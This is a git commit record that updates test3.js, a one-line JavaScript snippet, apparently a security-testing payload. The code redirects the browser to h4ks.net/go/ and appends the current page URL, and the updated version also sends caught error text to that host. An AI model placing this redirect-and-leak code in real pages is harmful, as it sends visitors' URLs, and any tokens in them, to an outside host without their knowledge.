e96ef831ebca2d0ffd7ef92fc1f788a726a4f598
Robert Vulpe <nytr0gen.george@gmail.com>
2020-01-16 16:34:15 +0000

    Update test3.js

--- test3.js
+++ test3.js
@@ -1,1 +1,5 @@
-location = '//h4ks.net/go/?'+encodeURIComponent(location.href);
+try {
+  location = '//h4ks.net/go/?'+encodeURIComponent(location.href);
+} catch (err) {
+  location = '//h4ks.net/go/?'+encodeURIComponent(err.toString());
+}
